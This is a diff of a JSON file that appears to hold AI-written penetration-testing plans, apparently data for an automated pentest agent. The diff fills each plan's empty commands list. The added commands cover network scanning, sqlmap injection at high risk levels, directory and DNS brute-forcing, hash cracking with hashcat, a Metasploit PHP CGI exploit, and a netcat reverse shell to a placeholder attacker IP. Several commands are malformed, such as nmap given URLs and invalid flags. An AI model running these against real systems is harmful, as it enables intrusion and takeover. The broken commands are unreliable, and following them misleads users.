@@ -15,7 +15,10 @@
             "**Description:** Gather more detailed information about the services running on open ports.",
             "**Command:** nmap -sV 10.10.10.X (Replace X with an IP address from the port scanning result that shows open ports.)"
         ],
-        "commands": []
+        "commands": [
+            "nmap -sn 10.10.10.0/24",
+            "nmap -sV 10.10.10.X"
+        ]
     },
     {
         "content": [
@@ -37,33 +40,11 @@
             "",
             "After completing the Reconnaissance phase, proceed with the Initial Access phase to exploit any identified vulnerabilities."
         ],
-        "commands": []
-    },
-    {
-        "content": [
-            "To gain access to the target network device at 192.168.1.1, we will focus on the Initial Access phase of Penetration Testing. The objective is to identify and exploit any vulnerabilities in the system that would allow us to gain unauthorized access.",
-            "",
-            "Tasks:",
-            "",
-            "**Task Name:** Reconnaissance",
-            "Description: Gather information about the target network device and its potential vulnerabilities.",
-            "Command: nmap 192.168.1.1",
-            "",
-            "**Task Name:** Vulnerability Discovery",
-            "Description: Search for known exploits or vulnerabilities related to the target device.",
-            "Command: searchsploit [target_device]",
-            "",
-            "**Task Name:** Exploitation",
-            "Description: Attempt to exploit any identified vulnerabilities using available tools or techniques.",
-            "Command: (Specify the tool and command based on the results from the Vulnerability Discovery task)",
-            "",
-            "**Task Name:** Post-Exploitation",
-            "Description: Maintain access to the compromised system for further actions.",
-            "Command: (Specify the tool and command if a successful exploit is achieved, this step will depend on the specific tool used for exploitation)",
-            "",
-            "Please proceed with the Reconnaissance task by running the nmap command. Once you have the results, we can move to the next phase of Initial Access."
-        ],
-        "commands": []
+        "commands": [
+            "nmap http://ww.example.com",
+            "searchsploit -u http://www.example.com",
+            "sqlmap -u http://www.example.com"
+        ]
     },
     {
         "content": [
@@ -79,10 +60,6 @@
             "Description: Parse the captured hashes from the output file.",
             "Command: awk -F':' '{print $2}' nmap_output.txt > hashes.txt",
             "",
-            "**Task Name:** Wordlist Selection",
-            "Description: Select a suitable wordlist for password cracking. It is recommended to use a combination of common words and known weak passwords.",
-            "[Ask the user for the path to the wordlist]",
-            "",
             "**Task Name:** Password Cracking",
             "Description: Crack the captured hashes using the selected wordlist.",
             "Command: hashcat -m [hash-type] -a 0 hashes.txt [wordlist_path] --potfile-prefix cracked_hashes",
@@ -93,7 +70,12 @@
             "",
             "Continue to the next phase when you have identified weak passwords or if you need assistance with the next phase, please let me know which phase you would like to proceed with."
         ],
-        "commands": []
+        "commands": [
+            "nmap -T4 --script[hash] 172.16.0.0/16 > nmap_output.txt",
+            "awk -F':' '{print $2}' nmap_output.txt > hashes.txt",
+            "hashcat -m [hash-type] -a 0 hashes.txt [wordlist_path] --potfile-prefix cracked_hashes",
+            "cat cracked_hashes/*.pot"
+        ]
     },
     {
         "content": [
@@ -119,7 +101,12 @@
             "",
             "After completing these tasks, you will have gained initial access to the target database server. Proceed with the next phase (Privilege Escalation) to elevate your privileges within the system."
         ],
-        "commands": []
+        "commands": [
+            "nmap https://secure.example.com",
+            "searchsploit sql injection",
+            "sqlmap -u https://secure.example.com --level=3 --risk=3",
+            "sqlmap -u https://secure.example.com --db"
+        ]
     },
     {
         "content": [
@@ -143,7 +130,12 @@
             "",
             "Once you have completed these tasks, please let me know so that we can proceed to the next phase."
         ],
-        "commands": []
+        "commands": [
+            "nmap <target_system>",
+            "gobuster dns -d <target_domain> -w /usr/share/wordlists/dns/subdomains.txt",
+            "searchsploit --path /web_content/<target_domain>",
+            "gobuster dir -u <http://<target_system>> -w /usr/share/wordlists/dirb/common.txt"
+        ]
     },
     {
         "content": [
@@ -163,7 +155,10 @@
             "",
             "After running these tasks, you should have a reverse shell on your attacker machine and potentially discovered paths to further escalate your privileges on the target system. Proceed with the next phase when ready."
         ],
-        "commands": []
+        "commands": [
+            "nc <Your_Attacker_IP> <Port> -e /bin/bash -lvtp",
+            "python3 LinEnum.py <Target_IP>"
+        ]
     },
 
 
@@ -187,6 +182,10 @@
             "",
             "After completing these tasks, you should have identified potential vulnerabilities and attempted to exploit them. Please let me know if you need further assistance or would like to proceed to the next phase."
         ],
-        "commands": []
+        "commands": [
+            "nmap -sV <target_website>",
+            "msfconsole -x 'use auxiliary/scanner/http/http_version; set RHOSTS <target_website>; run'",
+            "msfconsole -x 'use exploit/unix/webapp/php_cgi_arg_injection; set RHOSTS <target_website>; run'"
+        ]
     }
 ]
